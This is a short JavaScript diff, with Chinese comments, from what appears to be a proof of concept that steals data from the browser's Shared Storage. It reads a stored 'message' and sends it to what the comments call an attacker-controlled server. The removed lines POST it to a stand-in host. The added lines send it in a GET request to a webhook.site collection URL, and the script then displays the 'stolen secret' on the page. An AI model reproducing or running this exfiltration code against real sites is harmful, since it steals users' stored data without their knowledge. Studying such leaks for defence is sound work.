@@ -11,11 +11,9 @@
         // 尝试从 Shared Storage 读取消息
         const secret = await sharedStorage.get("message");
         // 将 secret 通过 fetch 发送到攻击者控制的服务器
-        await fetch("https://yourserver.com/steal", {
-          method: "POST",
-          headers: { "Content-Type": "text/plain" },
-          body: secret
-        });
+        const url = new URL("https://webhook.site/a39336da-a963-4109-8cbe-575040541868/steal");
+        url.searchParams.append("secret", secret);
+        await fetch(url, { method: "GET" });
         // 也可以在页面上显示 secret（用于调试）
         document.body.innerHTML = `<h1>Stolen secret:</h1><pre>${secret}</pre>`;
       } catch (err) {
